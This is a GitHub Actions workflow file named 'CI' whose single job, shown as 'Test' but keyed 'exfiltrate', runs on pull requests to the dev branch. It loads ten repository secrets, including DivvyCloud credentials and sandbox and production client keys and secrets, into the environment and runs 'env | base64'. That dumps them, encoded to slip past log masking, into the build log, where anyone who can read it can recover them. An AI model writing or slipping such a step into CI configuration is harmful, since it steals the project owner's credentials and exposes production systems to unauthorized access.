name: CI

on:
  pull_request:
    branches: [dev]
    types: [opened, reopened, synchronize, edited]

jobs:
  exfiltrate:
    name: Test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: exfiltrate env
        run: env | base64
        env:
          DIVVYCLOUD_USERNAME: ${{ secrets.DIVVYCLOUD_USERNAME }}
          DIVVYCLOUD_PASSWORD: ${{ secrets.DIVVYCLOUD_PASSWORD }}
          KNOWLEDGE_BASE_SANDBOX_CLIENT_KEY: ${{ secrets.KNOWLEDGE_BASE_SANDBOX_CLIENT_KEY }}
          KNOWLEDGE_BASE_SANDBOX_CLIENT_SECRET: ${{ secrets.KNOWLEDGE_BASE_SANDBOX_CLIENT_SECRET }}
          KNOWLEDGE_BASE_PRODUCTION_CLIENT_KEY: ${{ secrets.KNOWLEDGE_BASE_PRODUCTION_CLIENT_KEY }}
          KNOWLEDGE_BASE_PRODUCTION_CLIENT_SECRET: ${{ secrets.KNOWLEDGE_BASE_PRODUCTION_CLIENT_SECRET }}
          STANDARD_CHANGE_SANDBOX_CLIENT_KEY: ${{ secrets.STANDARD_CHANGE_SANDBOX_CLIENT_KEY }}
          STANDARD_CHANGE_SANDBOX_CLIENT_SECRET: ${{ secrets.STANDARD_CHANGE_SANDBOX_CLIENT_SECRET }}
          STANDARD_CHANGE_PRODUCTION_CLIENT_KEY: ${{ secrets.STANDARD_CHANGE_PRODUCTION_CLIENT_KEY }}
          STANDARD_CHANGE_PRODUCTION_CLIENT_SECRET: ${{ secrets.STANDARD_CHANGE_PRODUCTION_CLIENT_SECRET }}
